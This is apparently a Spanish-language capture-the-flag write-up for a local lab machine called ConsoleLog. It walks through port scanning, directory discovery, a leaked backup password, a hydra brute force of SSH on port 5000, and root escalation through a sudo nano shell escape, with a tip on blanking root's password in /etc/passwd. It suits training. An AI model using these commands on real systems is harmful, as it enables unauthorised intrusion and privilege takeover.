- Tags: #ConsoleLog
---
[Mquina ConsoleLog](https://mega.nz/file/oGMWiKoJ#l02GwzicvsgLaczCjTSqaJNl5-NGajklpOY3A3Tu9to) ==>Enlace de descarga al laboratorio.
```bash
7z x consolelog.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh consolelog.tar # Desplegamos el laboratorio
```

#### Fase Reconocimiento:
```bash
172.17.0.2 --> Direccion IP del target
ping -c 1 172.17.0.2

wichSystem.py 172.17.0.2 # Estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```
---

#### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos descubrimiento de puertos
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
nmap -sC -sV -p80,3000,5000 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corren detras de estos puertos.
```

**(  80/tcp   open  http    Apache httpd 2.4.61 ((Debian)) )** ==> Tenemos un servicio web desplegado en el puerto 80
**( Apache httpd 2.4.61 ((Debian)) )** ==> En la web **launcPad** determinamos que estamos ante una version de **debianSid**
**( 3000/tcp open  http    Node.js Express framework )** ==> Framework web de **js**
**( 5000/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) )** ==> Tenemos un servicio ssh desplegado en el puerto 5000

#### Fase Reconocimiento Web:
```bash
http://172.17.0.2/ --> # Ingresamo al servicio, donde tenemos un boton en fase beta

whatweb http://172.17.0.2 # No nos representa informacion critica, Asi mismo wappalyzer nos reporta que desde le backend se esta ejecutando php
http://172.17.0.2 [200 OK] Apache[2.4.61], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.61 (Debian)], IP[172.17.0.2], Script, Title[Mi Sitio]
```

Realizamos descubrimiento de rutas:
```bash
dirb http://172.17.0.2 # Nos reporta lo siguiente
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash # Realizamos descubrimiento de rutas:

/backend/             (Status: 200) [Size: 1563]  # Tenemos capacidad de directoryListing
/javascript/          (Status: 403) [Size: 275]
```
---
**( <script src="[authentication.js](view-source:http://172.17.0.2/authentication.js)"></script> )** ==> Tenemos desde el codigo fuente este enlace que parece llevar a un panel de autentificacion.
**( /backend )** ==> En su archivo de configuracion encontramos, **( lapassworddebackupmaschingonadetodas )** ==> Tenemos una posible contrasena filtrada, Lanzamos una peticion con el siguiente comando.

```bash
curl -s -X POST http://172.17.0.2:3000/recurso/ -H 'Content-Type: application/json' -d '{"token": "tokentraviesito"}'
lapassworddebackupmaschingonadetodas # nos retorna esto.
```

Realizaremos un ataque de fuerza bruta con **hydra** al servicio ssh que esta desplegado en el puerto 5000 para ver si logramos detectar algun usuario
```bash
 hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p lapassworddebackupmaschingonadetodas -t 64 -s 22 -f ssh://172.17.0.2:5000 # Logrando detectar a este posible usuario.
[5000][ssh] host: 172.17.0.2   login: lovely   password: lapassworddebackupmaschingonadetodas
```

#### Fase Intrusion:
```bash
ssh-keygen -R 172.17.0.2 && ssh lovely@172.17.0.2 -p 5000
```

#### Fase Escalada Privilegios.
```bash
sudo -l

User lovely may run the following commands on 6c673a12be19: # Tenemos una via potencial de elevar privielgios.
    (ALL) NOPASSWD: /usr/bin/nano
```

Tenemos capacidad de ejecutar este binario con privilegios:
```bash
sudo -u root /usr/bin/nano # Despues realizaremos las siguientes instrucciones para obtener una bash como root

^R^X
reset; sh 1>&0 2>&0
```

Tenemos control total sobre el sistema
**Nota:** ==> Tambien podiamos usar nano para sobreescribir el archivo: **( /etc/passwd )** y quitarle la: **( x )** al usuario root. para loguearnos sin proporcionar password.